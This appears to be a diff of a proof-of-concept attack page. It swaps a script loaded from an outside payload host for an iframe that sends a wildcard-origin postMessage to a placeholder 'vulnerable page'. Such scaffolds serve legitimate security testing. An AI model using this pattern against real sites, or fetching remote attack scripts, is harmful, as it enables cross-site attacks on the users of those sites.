@@ -4,11 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
+	<script>
+		function hack(){
+			setTimeout(function(){document.getElementById("i").contentWindow.postMessage('The_message','*');},2000);
+		};
+	</script>
 </head>
 <body>
-    
-    <script src="https://js.rip/6xyv063zk8">
-		alert();
-	</script>
+    <iframe id="i" src="vulnerable page" onload="hack()"></iframe>
 </body>
 </html>
